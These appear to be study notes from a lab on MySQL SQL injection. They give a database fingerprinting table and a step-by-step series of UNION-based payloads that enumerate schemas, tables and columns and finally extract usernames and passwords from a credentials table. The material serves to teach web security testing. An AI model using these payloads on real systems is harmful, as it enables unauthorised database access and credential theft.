## MySQL Fingerprinting
|Payload|When to Use|Expected Output|Wrong Output|
|---|---|---|---|
|`SELECT @@version`|When we have full query output|MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'|In MSSQL it returns MSSQL version. Error with other DBMS.|
|`SELECT POW(1,1)`|When we only have numeric output|`1`|Error with other DBMS|
|`SELECT SLEEP(5)`|Blind/No Output|Delays page response for 5 seconds and returns `0`.|Will not delay response with other DBMS|
## INFORMATION_SCHEMA Database

```sql
SELECT * FROM my_database.users;
```
## SCHEMATA

```sql
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
![](Pasted%20image%2020260619120131.png)

```sql
cn' UNION select 1,database(),2,3-- -
```
![](Pasted%20image%2020260619120148.png)
## TABLES

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
![](Pasted%20image%2020260619120516.png)
## COLUMNS

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
![](Pasted%20image%2020260619120541.png)
## Data

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
![](Pasted%20image%2020260619120612.png)
